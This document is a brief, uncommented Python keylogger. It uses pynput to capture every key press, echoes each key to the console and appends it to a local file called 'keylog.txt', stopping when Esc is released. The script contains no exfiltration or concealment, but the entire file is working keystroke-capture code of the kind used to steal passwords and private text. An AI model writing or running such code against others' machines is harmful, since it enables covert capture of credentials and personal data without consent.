
from pynput.keyboard import Key, Listener


def on_press(key):
    try:
        print(f'{key.char} pressed')
        with open("keylog.txt", "a") as log:
            log.write(f'{key.char} pressed\n')
    except AttributeError:
        print(f'{key} pressed')
        with open("keylog.txt", "a") as log:
            log.write(f'{key} pressed\n')

def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
